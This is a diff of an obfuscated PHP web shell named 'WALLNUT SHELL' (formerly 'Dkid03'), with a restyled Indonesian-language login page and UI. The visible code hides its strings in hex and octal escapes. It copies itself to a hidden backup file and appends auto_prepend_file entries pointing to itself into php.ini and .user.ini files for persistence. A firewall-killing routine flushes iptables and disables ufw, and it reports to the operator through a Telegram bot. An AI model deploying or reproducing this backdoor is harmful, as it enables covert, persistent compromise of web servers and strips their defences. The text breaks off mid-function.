"\102\x41\x43\x4b\125\120\x20\106\101\111\x4c\105\104\xa\12\104\151\x72\x65\143\x74\x6f\x72\171\40\156\x6f\164\x20\x77\x72\151\x74\x61\142\x6c\x65\72\x20" . __DIR__); return array("\163\164\141\x74\165\163" => "\145\162\162\x6f\x72", "\x6d\145\x73\x73\141\147\145" => "\104\151\162\145\143\x74\x6f\162\171\x20\156\x6f\x74\x20\167\162\151\164\x61\142\154\x65"); } $backup_file = __DIR__ . "\57\56" . basename(__FILE__) . "\x2e\142\141\153"; if (file_exists($backup_file)) { @unlink($backup_file); } $result = @copy(__FILE__, $backup_file); if ($result) { @chmod($backup_file, 420); sendTelegramMessage($botToken, $telegramUserId, "\102\x41\x43\x4b\x55\120\40\103\122\105\101\x54\105\104\12\12\106\151\x6c\145\72\40{$backup_file}"); return array("\x73\x74\141\x74\165\x73" => "\x73\165\x63\x63\145\x73\x73", "\x6d\x65\x73\x73\x61\147\145" => "\x42\x61\143\x6b\165\x70\x20\x63\162\145\141\x74\145\x64\72\40" . $backup_file); } else { $error = error_get_last(); $err_msg = $error["\x6d\145\163\163\x61\147\x65"] ?? "\125\x6e\153\156\x6f\x77\x6e\40\145\162\162\x6f\162"; sendTelegramMessage($botToken, $telegramUserId, "\x42\x41\103\x4b\x55\x50\40\x46\101\111\114\x45\x44\12\12{$err_msg}"); return array("\x73\x74\x61\164\165\x73" => "\x65\x72\x72\x6f\x72", "\x6d\145\x73\x73\x61\x67\x65" => "\x46\141\x69\154\145\144\x20\x74\157\40\143\x72\x65\141\164\x65\40\142\141\143\153\x75\160\72\40" . $err_msg); } } goto chNn7; WSU6n: function getSystemInfo() { return array("\120\x48\120\x20\126\145\x72\x73\x69\157\x6e" => phpversion(), "\x53\x65\x72\x76\145\162\40\x53\157\146\x74\x77\x61\162\x65" => isset($_SERVER["\x53\x45\122\126\105\x52\x5f\123\117\106\x54\x57\101\122\105"]) ? $_SERVER["\123\x45\x52\126\x45\122\137\x53\117\106\x54\127\x41\x52\105"] : "\x55\156\x6b\x6e\x6f\167\x6e", "\123\x65\x72\x76\145\162\x20\101\x50\x49" => php_sapi_name(), "\x6d\x61\170\x5f\x65\170\145\143\x75\x74\x69\x6f\156\137\x74\x69\x6d\x65" => ini_get("\155\x61\170\137\x65\170\145\143\165\x74\x69\157\x6e\x5f\x74\151\155\145") . "\40\x73\145\x63\x6f\x6e\x64\163", "\x6d\145\155\157\162\x79\x5f\154\x69\155\151\164" => ini_get("\155\145\155\157\x72\171\137\x6c\x69\x6d\151\x74"), "\165\160\154\x6f\x61\x64\137\x6d\x61\170\x5f\x66\x69\x6c\x65\163\x69\x7a\145" => ini_get("\x75\160\154\x6f\141\144\x5f\x6d\141\170\137\x66\x69\x6c\145\x73\151\x7a\145"), "\x70\x6f\x73\x74\x5f\x6d\141\170\137\163\x69\x7a\x65" => ini_get("\160\157\163\x74\137\x6d\x61\x78\x5f\163\x69\x7a\x65"), "\x44\x69\x73\141\142\154\145\x64\x20\106\165\x6e\x63\x74\x69\157\x6e\163" => ini_get("\144\151\163\x61\142\x6c\x65\137\146\165\156\x63\164\x69\157\156\x73") ?: "\156\157\x6e\x65", "\x53\141\146\145\x20\x4d\157\x64\145" => ini_get("\x73\141\146\145\x5f\155\157\144\145") ? "\x4f\x6e" : "\x4f\146\146", "\117\160\x65\162\141\164\x69\x6e\147\x20\123\x79\x73\164\145\x6d" => php_uname("\x73") . "\40" . php_uname("\x72"), "\x43\165\x72\162\x65\156\164\x20\125\163\145\162" => get_current_user(), "\104\157\x63\165\x6d\145\x6e\x74\40\122\157\x6f\x74" => isset($_SERVER["\x44\117\x43\x55\x4d\x45\x4e\124\x5f\x52\x4f\x4f\124"]) ? $_SERVER["\104\117\103\125\x4d\x45\x4e\124\x5f\122\x4f\x4f\x54"] : "\x55\x6e\153\x6e\x6f\167\156", "\x53\143\162\x69\160\164\x20\x50\x61\x74\x68" => __FILE__); } goto SGMJj; nPnwq: ?>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dkid03</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>WALLNUT SHELL</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #0d1117; --bg-card: #161b22; --bg-hover: #1f242f; --text: #c9d1d9; --text-muted: #8b949e; --accent: #58a6ff; --border: #30363d; --danger: #f85149; --success: #3fb950; --warning: #d29922; --radius: 6px; }
+        :root {
+            --bg-primary: #0b0e14;
+            --bg-secondary: #111820;
+            --bg-card: #141d2b;
+            --bg-card-hover: #1a2638;
+            --bg-input: #0d1520;
+            --bg-glass: rgba(20, 29, 43, 0.75);
+            --text-primary: #e8edf5;
+            --text-secondary: #a8b8c8;
+            --text-muted: #6a7a8a;
+            --text-accent: #64f0b8;
+            --border-subtle: rgba(100, 240, 184, 0.08);
+            --border-card: rgba(255, 255, 255, 0.04);
+            --border-active: rgba(100, 240, 184, 0.25);
+            --glow-accent: rgba(100, 240, 184, 0.06);
+            --glow-danger: rgba(255, 70, 85, 0.08);
+            --glow-success: rgba(60, 210, 120, 0.08);
+            --glow-warning: rgba(255, 180, 50, 0.08);
+            --shadow-card: 0 8px 32px rgba(0, 0, 0, 0.4);
+            --shadow-glow: 0 0 60px rgba(100, 240, 184, 0.03);
+            --radius-sm: 6px;
+            --radius-md: 10px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+        }
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:var(--bg); color:var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; line-height:1.6; min-height:100vh; }
-        a { color:var(--accent); text-decoration:none; }
-        a:hover { text-decoration:underline; }
-        .login-container { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
-        .login-box { background:var(--bg-card); padding:30px; border-radius:var(--radius); border:1px solid var(--border); max-width:400px; width:100%; }
-        .login-title { text-align:center; margin-bottom:20px; font-size:1.5rem; font-weight:600; color:var(--accent); }
+        body { background:var(--bg-primary); color:var(--text-primary); font-family:var(--font); font-size:14px; line-height:1.6; min-height:100vh; -webkit-font-smoothing:antialiased; }
+        ::selection { background:rgba(100,240,184,0.2); color:var(--text-accent); }
+        ::-webkit-scrollbar { width:4px; height:4px; }
+        ::-webkit-scrollbar-track { background:transparent; }
+        ::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.08); border-radius:10px; }
+        ::-webkit-scrollbar-thumb:hover { background:rgba(255,255,255,0.15); }
+        a { color:var(--text-accent); text-decoration:none; transition:var(--transition); }
+        a:hover { color:var(--text-accent); opacity:0.8; }
+
+        .login-wrapper { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; background:var(--bg-primary); position:relative; overflow:hidden; }
+        .login-wrapper::before { content:''; position:absolute; width:600px; height:600px; border-radius:50%; background:radial-gradient(circle, rgba(100,240,184,0.04), transparent 70%); top:-200px; right:-200px; pointer-events:none; }
+        .login-wrapper::after { content:''; position:absolute; width:400px; height:400px; border-radius:50%; background:radial-gradient(circle, rgba(100,240,184,0.03), transparent 70%); bottom:-150px; left:-150px; pointer-events:none; }
+        .login-box { background:var(--bg-glass); backdrop-filter:blur(24px); -webkit-backdrop-filter:blur(24px); border:1px solid var(--border-card); border-radius:var(--radius-xl); padding:48px 40px 40px; max-width:420px; width:100%; position:relative; box-shadow:var(--shadow-card), var(--shadow-glow); }
+        .login-box::before { content:''; position:absolute; inset:-1px; border-radius:var(--radius-xl); padding:1px; background:linear-gradient(135deg, rgba(100,240,184,0.1), transparent 50%, rgba(100,240,184,0.05)); -webkit-mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); -webkit-mask-composite:xor; mask-composite:exclude; pointer-events:none; }
+        .login-brand { text-align:center; margin-bottom:32px; }
+        .login-brand h1 { font-size:28px; font-weight:700; letter-spacing:-0.5px; color:var(--text-primary); }
+        .login-brand h1 span { color:var(--text-accent); text-shadow:0 0 40px rgba(100,240,184,0.1); }
+        .login-brand p { color:var(--text-muted); font-size:12px; letter-spacing:0.5px; margin-top:4px; font-weight:400; }
+        .login-divider { border:none; border-top:1px solid var(--border-card); margin:20px 0; }
+
+        .form-group { margin-bottom:16px; }
+        .form-group label { display:block; font-size:11px; font-weight:600; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.8px; margin-bottom:6px; }
+        .form-control { width:100%; padding:10px 14px; background:var(--bg-input); border:1px solid var(--border-card); border-radius:var(--radius-md); color:var(--text-primary); font-family:var(--font); font-size:14px; transition:var(--transition); outline:none; }
+        .form-control:focus { border-color:var(--text-accent); box-shadow:0 0 0 3px var(--glow-accent); }
+        .form-control::placeholder { color:var(--text-muted); opacity:0.5; }
+
+        .btn { display:inline-flex; align-items:center; justify-content:center; gap:8px; padding:10px 20px; background:rgba(255,255,255,0.03); border:1px solid var(--border-card); border-radius:var(--radius-md); color:var(--text-secondary); font-family:var(--font); font-size:13px; font-weight:500; cursor:pointer; transition:var(--transition); outline:none; }
+        .btn:hover { background:var(--bg-card-hover); border-color:var(--text-accent); color:var(--text-accent); transform:translateY(-1px); }
+        .btn-block { display:flex; width:100%; justify-content:center; }
+        .btn-primary { background:rgba(100,240,184,0.1); border-color:var(--text-accent); color:var(--text-accent); }
+        .btn-primary:hover { background:rgba(100,240,184,0.2); box-shadow:0 0 30px var(--glow-accent); }
+        .btn-danger { border-color:rgba(255,70,85,0.3); color:#ff4655; }
+        .btn-danger:hover { background:rgba(255,70,85,0.1); border-color:#ff4655; }
+        .btn-success { border-color:rgba(60,210,120,0.3); color:#3cd278; }
+        .btn-success:hover { background:rgba(60,210,120,0.1); border-color:#3cd278; }
+        .btn-warning { border-color:rgba(255,180,50,0.3); color:#ffb432; }
+        .btn-warning:hover { background:rgba(255,180,50,0.1); border-color:#ffb432; }
+        .btn-sm { padding:5px 12px; font-size:11px; }
+
         .app-container { display:flex; min-height:100vh; }
-        .main-content { flex:1; padding:20px; margin-left:220px; }
-        @media(max-width:768px){ .main-content { margin-left:0; padding:10px; } }
-        .sidebar { width:220px; background:var(--bg-card); border-right:1px solid var(--border); height:100vh; position:fixed; top:0; left:0; overflow-y:auto; display:flex; flex-direction:column; z-index:100; }
-        .sidebar-header { padding:15px; border-bottom:1px solid var(--border); }
-        .sidebar-title { font-size:1.1rem; font-weight:600; color:var(--accent); }
-        .sidebar-subtitle { font-size:0.7rem; color:var(--text-muted); word-break:break-all; }
-        .sidebar-menu { padding:10px; flex:1; }
-        .menu-section { margin-bottom:12px; }
-        .menu-title { font-size:0.6rem; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); padding:0 8px; margin-bottom:4px; }
-        .menu-item { display:flex; align-items:center; gap:10px; padding:6px 12px; border-radius:var(--radius); color:var(--text); cursor:pointer; transition:0.2s; font-size:0.8rem; background:transparent; border:none; width:100%; text-align:left; }
-        .menu-item:hover { background:var(--bg-hover); color:var(--accent); }
-        .menu-item i { width:18px; text-align:center; font-size:0.85rem; }
-        .logout-btn { color:var(--danger); margin-top:auto; }
-        .logout-btn:hover { background:rgba(248,81,73,0.1); color:var(--danger); }
-        .menu-toggle { display:none; position:fixed; top:10px; left:10px; z-index:999; background:var(--bg-card); border:1px solid var(--border); color:var(--text); border-radius:var(--radius); padding:8px 12px; cursor:pointer; font-size:0.9rem; }
-        @media(max-width:768px){ .menu-toggle { display:block; } .sidebar { transform:translateX(-100%); width:260px; } .sidebar.active { transform:translateX(0); } }
-        .card { background:var(--bg-card); border-radius:var(--radius); border:1px solid var(--border); margin-bottom:12px; overflow:hidden; }
-        .card-header { padding:10px 14px; border-bottom:1px solid var(--border); font-weight:500; display:flex; justify-content:space-between; align-items:center; font-size:0.85rem; }
-        .card-body { padding:10px 14px; max-height:55vh; overflow-y:auto; }
-        .table { width:100%; border-collapse:collapse; font-size:0.8rem; }
-        .table th { text-align:left; padding:6px 8px; border-bottom:1px solid var(--border); color:var(--text-muted); font-weight:500; position:sticky; top:0; background:var(--bg-card); }
-        .table td { padding:4px 8px; border-bottom:1px solid var(--border); }
-        .table tr:hover td { background:var(--bg-hover); }
-        .folder { color:var(--accent); }
-        .file { color:var(--text); }
-        .file-icon { margin-right:4px; }
+        .main-content { flex:1; padding:24px 28px; margin-left:240px; transition:var(--transition); }
+        @media(max-width:768px){ .main-content { margin-left:0; padding:16px; } }
+
+        .sidebar { width:240px; background:var(--bg-secondary); border-right:1px solid var(--border-card); height:100vh; position:fixed; top:0; left:0; overflow-y:auto; display:flex; flex-direction:column; z-index:100; transition:transform 0.3s cubic-bezier(0.4,0,0.2,1); backdrop-filter:blur(20px); }
+        .sidebar-header { padding:20px 20px 16px; border-bottom:1px solid var(--border-card); }
+        .sidebar-title { font-size:18px; font-weight:700; letter-spacing:-0.3px; color:var(--text-primary); }
+        .sidebar-title span { color:var(--text-accent); }
+        .sidebar-subtitle { font-size:10px; color:var(--text-muted); word-break:break-all; margin-top:2px; opacity:0.6; font-weight:400; letter-spacing:0.3px; }
+        .sidebar-menu { padding:12px 8px; flex:1; overflow-y:auto; }
+        .menu-section { margin-bottom:4px; }
+        .menu-title { font-size:9px; text-transform:uppercase; letter-spacing:1.2px; color:var(--text-muted); padding:6px 12px; margin-bottom:2px; font-weight:600; opacity:0.5; }
+        .menu-item { display:flex; align-items:center; gap:10px; padding:7px 14px; border-radius:var(--radius-md); color:var(--text-secondary); cursor:pointer; transition:var(--transition); font-size:12.5px; background:transparent; border:none; width:100%; text-align:left; position:relative; font-family:var(--font); }
+        .menu-item::before { content:''; position:absolute; left:0; top:50%; transform:translateY(-50%); width:2px; height:0; background:var(--text-accent); border-radius:0 3px 3px 0; transition:var(--transition); }
+        .menu-item:hover { background:var(--bg-card-hover); color:var(--text-primary); }
+        .menu-item:hover::before { height:18px; }
+        .menu-item i { width:18px; text-align:center; font-size:13px; opacity:0.6; }
+        .menu-item:hover i { opacity:1; }
+        .menu-item.danger { color:#ff4655; }
+        .menu-item.danger:hover { background:var(--glow-danger); color:#ff4655; }
+        .menu-item.danger:hover::before { background:#ff4655; }
+        .menu-item.success { color:#3cd278; }
+        .menu-item.success:hover { background:var(--glow-success); color:#3cd278; }
+        .menu-item.success:hover::before { background:#3cd278; }
+        .menu-item.warning { color:#ffb432; }
+        .menu-item.warning:hover { background:var(--glow-warning); color:#ffb432; }
+        .menu-item.warning:hover::before { background:#ffb432; }
+        .logout-btn { margin-top:auto; border-top:1px solid var(--border-card); padding-top:12px; margin-top:8px; color:var(--text-muted); }
+        .logout-btn:hover { color:#ff4655; background:var(--glow-danger); }
+
+        .menu-toggle { display:none; position:fixed; top:12px; left:12px; z-index:999; background:var(--bg-glass); backdrop-filter:blur(12px); border:1px solid var(--border-card); color:var(--text-secondary); border-radius:var(--radius-md); padding:8px 12px; cursor:pointer; font-size:16px; transition:var(--transition); }
+        .menu-toggle:hover { border-color:var(--text-accent); color:var(--text-accent); }
+        @media(max-width:768px){ .menu-toggle { display:block; } .sidebar { transform:translateX(-100%); width:280px; background:var(--bg-primary); } .sidebar.active { transform:translateX(0); } .sidebar.active::after { content:''; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:-1; } }
+
+        .card { background:var(--bg-card); border-radius:var(--radius-lg); border:1px solid var(--border-card); margin-bottom:16px; overflow:hidden; transition:var(--transition); }
+        .card:hover { border-color:var(--border-subtle); }
+        .card-header { padding:14px 20px; border-bottom:1px solid var(--border-card); display:flex; justify-content:space-between; align-items:center; font-size:13px; font-weight:500; color:var(--text-secondary); }
+        .card-body { padding:16px 20px; max-height:60vh; overflow-y:auto; }
+
+        .table { width:100%; border-collapse:collapse; font-size:12.5px; }
+        .table th { text-align:left; padding:8px 10px; border-bottom:1px solid var(--border-card); color:var(--text-muted); font-weight:600; font-size:10px; text-transform:uppercase; letter-spacing:0.5px; position:sticky; top:0; background:var(--bg-card); }
+        .table td { padding:6px 10px; border-bottom:1px solid var(--border-card); }
+        .table tr:hover td { background:var(--bg-card-hover); }
+        .folder { color:var(--text-accent); font-weight:500; }
+        .file { color:var(--text-secondary); }
+        .file-icon { margin-right:6px; }
+
         .action-links { display:flex; gap:4px; flex-wrap:wrap; }
-        .action-links a { font-size:0.7rem; color:var(--text-muted); padding:2px 6px; border-radius:4px; background:rgba(255,255,255,0.04); transition:0.2s; }
-        .action-links a:hover { color:var(--accent); background:rgba(88,166,255,0.1); }
-        .breadcrumb { padding:6px 0; font-size:0.75rem; color:var(--text-muted); overflow-x:auto; white-space:nowrap; }
-        .breadcrumb a { color:var(--accent); }
-        .form-group { margin-bottom:10px; }
-        .form-group label { display:block; margin-bottom:3px; font-size:0.8rem; font-weight:500; }
-        .form-control { width:100%; padding:6px 10px; background:var(--bg); border:1px solid var(--border); border-radius:var(--radius); color:var(--text); font-size:0.85rem; transition:0.2s; }
-        .form-control:focus { outline:none; border-color:var(--accent); box-shadow:0 0 0 3px rgba(88,166,255,0.15); }
-        .btn { display:inline-block; padding:6px 14px; background:var(--bg); border:1px solid var(--border); border-radius:var(--radius); color:var(--text); cursor:pointer; font-size:0.8rem; transition:0.2s; text-align:center; }
-        .btn:hover { background:var(--bg-hover); border-color:var(--accent); color:var(--accent); }
-        .btn-block { display:block; width:100%; }
-        .btn-danger { border-color:var(--danger); color:var(--danger); }
-        .btn-danger:hover { background:rgba(248,81,73,0.1); }
-        .alert { padding:8px 12px; border-radius:var(--radius); margin-bottom:10px; font-size:0.85rem; }
-        .alert-danger { background:rgba(248,81,73,0.1); border:1px solid var(--danger); color:var(--danger); }
-        .alert-success { background:rgba(63,185,80,0.1); border:1px solid var(--success); color:var(--success); }
-        .terminal-output { background:var(--bg); padding:10px; border-radius:var(--radius); font-family:'Courier New',monospace; font-size:0.75rem; max-height:250px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border:1px solid var(--border); margin-bottom:8px; }
-        .terminal-input { display:flex; gap:6px; flex-wrap:wrap; }
-        .terminal-input .form-control { flex:1; min-width:120px; }
-        .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:1000; opacity:0; visibility:hidden; transition:0.25s; }
+        .action-links a { font-size:10px; color:var(--text-muted); padding:2px 8px; border-radius:var(--radius-sm); background:rgba(255,255,255,0.02); transition:var(--transition); border:1px solid transparent; }
+        .action-links a:hover { color:var(--text-accent); background:var(--glow-accent); border-color:var(--border-active); }
+        .action-links a.danger:hover { color:#ff4655; background:var(--glow-danger); border-color:rgba(255,70,85,0.2); }
+
+        .breadcrumb { padding:6px 0 12px; font-size:12px; color:var(--text-muted); overflow-x:auto; white-space:nowrap; }
+        .breadcrumb a { color:var(--text-secondary); transition:var(--transition); }
+        .breadcrumb a:hover { color:var(--text-accent); }
+
+        .stats-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(100px, 1fr)); gap:8px; margin-bottom:14px; }
+        .stat-item { background:var(--bg-input); padding:10px 14px; border-radius:var(--radius-md); border:1px solid var(--border-card); text-align:center; }
+        .stat-item .stat-value { font-size:16px; font-weight:600; color:var(--text-accent); }
+        .stat-item .stat-label { font-size:9px; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px; margin-top:2px; }
+
+        .alert { padding:10px 16px; border-radius:var(--radius-md); margin-bottom:12px; font-size:13px; border-left:3px solid; }
+        .alert-danger { background:var(--glow-danger); border-color:#ff4655; color:#ff4655; }
+        .alert-success { background:var(--glow-success); border-color:#3cd278; color:#3cd278; }
+        .alert-warning { background:var(--glow-warning); border-color:#ffb432; color:#ffb432; }
+
+        .terminal-output { background:var(--bg-input); padding:12px 16px; border-radius:var(--radius-md); font-family:var(--font-mono); font-size:12px; max-height:280px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border:1px solid var(--border-card); margin-bottom:10px; line-height:1.6; color:var(--text-secondary); }
+        .terminal-input { display:flex; gap:8px; flex-wrap:wrap; }
+        .terminal-input .form-control { flex:1; min-width:120px; font-family:var(--font-mono); font-size:13px; }
+
+        .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:1000; opacity:0; visibility:hidden; transition:0.25s; backdrop-filter:blur(12px); }
         .modal.active { opacity:1; visibility:visible; }
-        .modal-content { background:var(--bg-card); border-radius:var(--radius); max-width:500px; width:95%; max-height:90vh; overflow-y:auto; border:1px solid var(--border); transform:translateY(15px); transition:0.25s; }
-        .modal.active .modal-content { transform:translateY(0); }
-        .modal-header { padding:12px 16px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
-        .modal-title { font-size:1rem; font-weight:600; color:var(--accent); }
-        .modal-close { background:none; border:none; color:var(--text-muted); font-size:1.2rem; cursor:pointer; padding:0 4px; }
-        .modal-close:hover { color:var(--text); }
-        .modal-body { padding:16px; }
-        ::-webkit-scrollbar { width:5px; height:5px; }
-        ::-webkit-scrollbar-track { background:var(--bg); }
-        ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
-        ::-webkit-scrollbar-thumb:hover { background:var(--text-muted); }
-        @media(max-width:480px){ .table { font-size:0.7rem; } .table th, .table td { padding:3px 5px; } .action-links a { font-size:0.6rem; } }
+        .modal-content { background:var(--bg-card); border-radius:var(--radius-lg); max-width:520px; width:95%; max-height:90vh; overflow-y:auto; border:1px solid var(--border-card); transform:translateY(20px) scale(0.96); transition:0.3s cubic-bezier(0.4,0,0.2,1); box-shadow:var(--shadow-card); }
+        .modal.active .modal-content { transform:translateY(0) scale(1); }
+        .modal-header { padding:16px 20px; border-bottom:1px solid var(--border-card); display:flex; justify-content:space-between; align-items:center; }
+        .modal-title { font-size:16px; font-weight:600; color:var(--text-primary); }
+        .modal-close { background:none; border:none; color:var(--text-muted); font-size:20px; cursor:pointer; padding:0 4px; transition:var(--transition); }
+        .modal-close:hover { color:var(--text-primary); transform:rotate(90deg); }
+        .modal-body { padding:20px; }
+
+        .badge { display:inline-block; padding:2px 10px; border-radius:10px; font-size:9px; font-weight:600; text-transform:uppercase; letter-spacing:0.3px; }
+        .badge-root { background:rgba(255,70,85,0.2); color:#ff4655; }
+        .badge-user { background:rgba(255,255,255,0.06); color:var(--text-muted); }
+        .badge-shell { background:var(--glow-warning); color:#ffb432; }
+        .badge-chattr { background:var(--glow-success); color:#3cd278; }
+        .badge-on { background:var(--glow-success); color:#3cd278; }
+        .badge-off { background:var(--glow-danger); color:#ff4655; }
+
+        .toast-container { position:fixed; top:24px; right:24px; z-index:9999; display:flex; flex-direction:column; gap:8px; }
+        .toast { padding:12px 20px; border-radius:var(--radius-md); background:var(--bg-glass); backdrop-filter:blur(20px); border:1px solid var(--border-card); color:var(--text-secondary); font-size:13px; box-shadow:var(--shadow-card); animation:slideIn 0.3s ease; max-width:380px; font-family:var(--font); }
+        .toast-success { border-left:3px solid #3cd278; }
+        .toast-error { border-left:3px solid #ff4655; }
+        .toast-info { border-left:3px solid var(--text-accent); }
+        .toast-warning { border-left:3px solid #ffb432; }
+        @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+        @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+
+        @media(max-width:480px){ .login-box { padding:32px 24px; } .table { font-size:11px; } .table th, .table td { padding:4px 6px; } .action-links a { font-size:9px; padding:1px 6px; } .stats-grid { grid-template-columns:repeat(2, 1fr); } }
     </style>
 </head>
 <body>
-    <?php if (!isset($_SESSION['loggedin'])): ?>
-        <div class="login-container">
-            <div class="login-box">
-                <h1 class="login-title">Dkid03</h1>
-                <?php if (!empty($loginError)): ?>
-                    <div class="alert alert-danger"><?= htmlspecialchars($loginError) ?></div>
-                <?php endif; ?>
-                <?php if (!empty($loginSuccess)): ?>
-                    <div class="alert alert-success"><?= htmlspecialchars($loginSuccess) ?></div>
-                <?php endif; ?>
-                <?php if (isset($_SESSION['logout_success'])): ?>
-                    <div class="alert alert-success">✅ Anda berhasil logout <?php unset($_SESSION['logout_success']); ?></div>
-                <?php endif; ?>
-                <form method="post">
-                    <div class="form-group">
-                        <button type="submit" name="request_otp" class="btn btn-block"><i class="fab fa-telegram"></i> Kirim OTP ke Telegram</button>
-                    </div>
-                </form>
-                <?php if (isset($_SESSION['otp'])): ?>
-                <hr style="border-color:var(--border); margin:15px 0;">
-                <form method="post">
-                    <div class="form-group">
-                        <label for="otp">Masukkan Kode OTP</label>
-                        <input type="text" id="otp" name="otp" class="form-control" placeholder="6 digit" maxlength="6" required>
-                    </div>
-                    <button type="submit" name="verify_otp" class="btn btn-block">🔑 Login</button>
-                </form>
-                <?php endif; ?>
+
+<?php  goto qJUz7; KWt2w: function auto_prepend_inject() { global $botToken, $telegramUserId, $CURRENT_SHELL; $results = array(); $shellPath = __FILE__; $iniPaths = array("\57\x65\x74\143\57\x70\x68\160\x2e\x69\156\x69", "\x2f\x65\164\143\57\160\x68\160\57\x63\154\151\x2f\x70\150\x70\x2e\151\x6e\151", "\x2f\145\164\x63\x2f\x70\150\160\x2f\x61\160\x61\143\x68\145\x32\x2f\x70\150\160\x2e\151\156\x69", "\x2f\x65\164\x63\57\x70\150\160\57\x70\x68\160\x2e\151\x6e\x69", "\57\x75\x73\162\57\154\x6f\x63\x61\154\57\x6c\x69\142\x2f\x70\150\x70\56\151\x6e\x69", "\x2f\165\163\x72\57\154\x6f\143\x61\x6c\x2f\x70\150\160\57\x6c\151\x62\x2f\x70\150\x70\56\151\156\151", "\57\x6f\160\164\x2f\x70\150\160\57\160\x68\160\x2e\151\156\151"); foreach ($iniPaths as $ini) { if (file_exists($ini) && is_writable($ini)) { $content = @file_get_contents($ini); if ($content && strpos($content, "\x61\x75\x74\157\x5f\160\162\x65\160\145\156\x64\137\x66\151\x6c\x65") === false) { @file_put_contents($ini, "\12\141\x75\x74\157\x5f\x70\162\145\160\145\x6e\x64\x5f\x66\151\154\145\x20\75\40{$shellPath}\12", FILE_APPEND); $results[] = "{$ini}\40\x75\x70\144\141\x74\145\144"; } } } $roots = get_all_document_roots_cached(); foreach ($roots as $root) { $userIni = $root . "\x2f\x2e\x75\x73\145\x72\x2e\x69\x6e\x69"; if (is_dir($root) && is_writable($root)) { $content = @file_get_contents($userIni) ?: ''; if (strpos($content, "\x61\165\x74\157\x5f\x70\162\145\x70\x65\156\144\137\x66\x69\x6c\x65") === false) { @file_put_contents($userIni, "\141\165\x74\157\x5f\x70\162\145\160\x65\x6e\x64\137\146\x69\x6c\x65\40\x3d\40{$shellPath}\xa", FILE_APPEND); @chmod($userIni, 420); $results[] = "{$userIni}\40\x63\162\145\x61\164\145\x64\x2f\x75\x70\144\141\164\x65\144"; } } } $msg = "\101\125\x54\117\40\120\x52\x45\120\x45\116\104\x20\x49\x4e\112\x45\x43\x54\x20\122\105\x53\x55\114\x54\123\12\xa" . implode("\xa", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return $results; } goto O1NBy; Io1Kj: function firewall_killer() { global $botToken, $telegramUserId; $results = array(); if (function_exists("\163\x68\x65\x6c\x6c\x5f\x65\170\x65\x63")) { @shell_exec("\151\160\164\141\x62\x6c\x65\x73\x20\55\x46\x20\62\x3e\57\x64\x65\166\57\156\x75\154\x6c"); @shell_exec("\151\x70\164\x61\142\154\x65\163\x20\55\x58\40\62\x3e\57\x64\145\x76\x2f\156\x75\154\154"); @shell_exec("\151\x70\164\141\x62\x6c\145\163\x20\x2d\164\x20\x6e\141\x74\x20\55\x46\x20\x32\x3e\x2f\x64\x65\166\57\x6e\165\x6c\154"); @shell_exec("\151\160\164\x61\x62\x6c\145\163\x20\55\164\40\155\141\156\147\x6c\145\x20\x2d\106\40\x32\x3e\57\x64\x65\166\x2f\x6e\165\x6c\154"); @shell_exec("\x69\x70\164\x61\142\x6c\x65\163\40\x2d\x50\x20\x49\116\120\x55\124\40\101\103\x43\x45\120\124\x20\x32\76\x2f\144\145\x76\x2f\156\x75\154\154"); @shell_exec("\151\x70\164\x61\142\154\145\x73\x20\55\120\x20\117\x55\124\120\x55\x54\40\x41\103\103\x45\x50\124\40\62\76\57\x64\145\x76\57\156\x75\x6c\154"); @shell_exec("\151\x70\164\141\142\x6c\145\x73\40\x2d\x50\x20\106\117\122\127\x41\122\x44\40\x41\103\103\x45\x50\x54\40\62\x3e\57\x64\x65\166\x2f\x6e\165\154\154"); $results[] = "\x69\160\x74\x61\x62\x6c\x65\x73\x20\146\154\165\163\x68\x65\x64\x20\46\x20\144\145\146\141\165\154\x74\x20\101\x43\103\x45\x50\124"; @shell_exec("\x75\146\167\40\55\x2d\x66\157\162\x63\x65\x20\x64\x69\x73\141\x62\x6c\x65\40\x32\76\57\x64\145\166\x2f\156\x75\x6c\154"); @shell_exec("\x73\x79\163\164\x65\x6d\143\x74\x6c\x20\163\x74\x6f\x70\40\x75\146\167\40\x32\76\57\x64\x65\166\57\x6e\165\154\154"); @shell_exec("\163\x79\x73\164\145\x6d\x63\x74\x6c\x20\144\151\163\x61\x62\154\x65\x20\x75\146\x77\x20\62\x3e\x2f\144\145\166\x2f\x6e\165\x6c\x6c"); $results[] = 